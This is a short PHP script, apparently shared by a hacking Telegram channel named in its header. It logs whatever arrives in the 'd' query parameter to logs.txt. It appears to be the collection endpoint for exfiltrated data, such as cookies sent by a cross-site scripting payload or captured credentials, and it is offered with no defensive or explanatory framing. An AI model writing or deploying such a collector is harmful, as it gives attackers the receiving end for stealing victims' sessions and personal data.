<?php
/***********************
Channel: T.me/hacking_01 
***********************/
if(isset($_GET["d"])){
	if(file_exists("logs.txt")){
		$file = fopen('logs.txt','a')
		or die("n");
		fwrite($file, $_GET["d"].' 
 ');
		fclose($file);
	}else{
		$file = fopen('logs.txt','w')
		or die("/n");
		fwrite($file, $_GET["d"].' ');
		fclose($file);
	}
}else{
	echo "Bad request.";
}
?>
